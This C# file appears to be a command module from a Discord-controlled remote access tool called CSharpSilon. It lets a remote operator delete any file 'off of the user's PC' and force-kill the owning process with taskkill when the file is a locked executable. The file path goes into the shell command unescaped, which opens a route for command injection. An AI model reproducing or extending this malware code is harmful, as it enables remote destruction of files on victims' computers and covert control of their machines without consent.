using System;
using System.IO;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class FileRemoval : ModuleBase<SocketCommandContext>
    {
        [Command("remove"), Summary("Deletes A File Off Of The User's PC")]
        public async Task Remove([Remainder] string path)
        {
            path = path.Replace("\"", "");
            try
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.Delete(path);
                        await ReplyAsync("File Deleted Successfully");
                    }
                    catch (UnauthorizedAccessException e)
                    {
                        if (path.EndsWith(".exe"))
                        {
                            Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                            File.Delete(path);
                            await ReplyAsync("File Deleted Successfully");
                        }
                        else
                        {
                            await ReplyAsync(
                                "Something's Using This File. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                        }
                    }
                    catch (AccessViolationException e)
                    {
                        if (path.EndsWith(".exe"))
                        {
                            Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                            File.Delete(path);
                            await ReplyAsync("File Deleted Successfully");
                        }
                        else
                        {
                            await ReplyAsync(
                                "Something's Using This File. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                        }
                    }
                    catch (Exception e)
                    {
                        if (path.EndsWith(".exe"))
                        {
                            Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                            File.Delete(path);
                            await ReplyAsync("File Deleted Successfully");
                        }
                        else
                        {
                            await ReplyAsync(
                                "Something's Using This File, Or I Dont Have Access To It. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                        }
                    }

                }
                else
                {
                    await ReplyAsync("File Doesn't Exist On The User's PC.");
                }
            }
            catch (UnauthorizedAccessException e)
            {
                if (path.EndsWith(".exe"))
                {
                    Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                    File.Delete(path);
                    await ReplyAsync("File Deleted Successfully");
                }
                else
                {
                    await ReplyAsync(
                        "Something's Using This File. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                }
            }
            catch (AccessViolationException e)
            {
                if (path.EndsWith(".exe"))
                {
                    Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                    File.Delete(path);
                    await ReplyAsync("File Deleted Successfully");
                }
                else
                {
                    await ReplyAsync(
                        "Something's Using This File. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                }
            }
            catch (Exception e)
            {
                if (path.EndsWith(".exe"))
                {
                    Utils.App.execute($"taskkill /f /im {Path.GetFileName(path)}");
                    File.Delete(path);
                    await ReplyAsync("File Deleted Successfully");
                }
                else
                {
                    await ReplyAsync(
                        "Something's Using This File, Or I Dont Have Access To It. Use The `?show` Command To See All Running Proccesses That Could Be Using It.");
                }
            }



        }
    }
}